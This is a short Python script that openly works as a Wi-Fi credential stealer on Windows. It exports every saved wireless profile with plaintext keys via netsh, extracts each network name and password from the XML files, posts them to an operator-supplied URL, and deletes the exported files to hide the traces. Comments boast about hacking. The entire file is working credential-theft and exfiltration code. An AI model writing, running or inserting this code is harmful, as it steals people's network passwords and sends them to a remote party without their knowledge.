import subprocess, os
import xml.etree.ElementTree as ET




#subprocess.run(["pip", "install", "requests"])
# subprocess.run(["python -m pip", "install", "requests"])
# subprocess.run(["python3", "-m", "pip", "install", "requests"])
import requests



# Show us what you have hidden, you CAN'T RUN AWAY
s = subprocess.run(
    ["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True
).stdout.decode()

wifi_ssid = []
wifi_pass = []


directory = os.getcwd()
wifi_list = [files for files in os.listdir(directory) if files.startswith("Wi-Fi") and files.endswith(".xml")]

for file in wifi_list:
    tree = ET.parse(file)
    root = tree.getroot()
    ssid = root[0].text
    wifi_ssid.append(ssid)
    password = root[4][0][1][2].text
    wifi_pass.append(password)

final = zip(wifi_ssid, wifi_pass)
res = {i[0]: i[1] for i in final}
# Common, we are hacking RIGHT NOW()
url = "" #Put url you wish to use in the string field.
requests.post(url, data=res)

# Delete all juicy xmls
for i in wifi_list:
    os.remove(i)